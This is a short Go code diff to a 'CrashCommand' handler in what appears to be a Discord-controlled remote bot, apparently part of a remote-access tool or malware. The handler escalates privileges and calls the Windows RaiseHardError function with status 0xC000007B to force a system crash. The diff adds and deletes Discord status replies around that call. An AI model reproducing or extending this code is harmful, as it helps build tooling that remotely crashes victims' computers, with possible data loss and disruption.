@@ -22,6 +22,8 @@ func (*CrashCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to adjust privileges.", msg.Reference())
 	}
 
+	initial, _ := ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully triggered crash.", msg.Reference())
+
 	ret, _, _ = store.RaiseHardError.Call(
 		uintptr(0xC000007B),
 		uintptr(0),
@@ -32,9 +34,11 @@ func (*CrashCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 	)
 
 	if ret != 0 {
+		ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
 		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to trigger crash.", msg.Reference())
 	}
 
+	ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
 	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to crash.", msg.Reference())
 }
 
